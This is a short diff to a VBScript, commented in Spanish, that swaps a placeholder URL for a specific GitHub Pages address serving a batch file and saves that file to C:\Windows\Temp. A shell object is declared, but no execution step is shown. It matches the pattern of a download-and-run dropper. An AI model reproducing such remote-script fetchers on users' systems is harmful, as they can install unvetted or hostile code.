@@ -1,7 +1,7 @@
 Dim url, destination, objHTTP, objFSO, objFile, objShell
 
 ' URL del archivo batch en tu dominio
-url = "https://tuusuario.github.io/repositorio/script.bat"
+url = "https://miurelc.github.io/main/script.bat"
 
 ' Ruta donde se guardará el archivo en el sistema
 destination = "C:\Windows\Temp\script.bat"
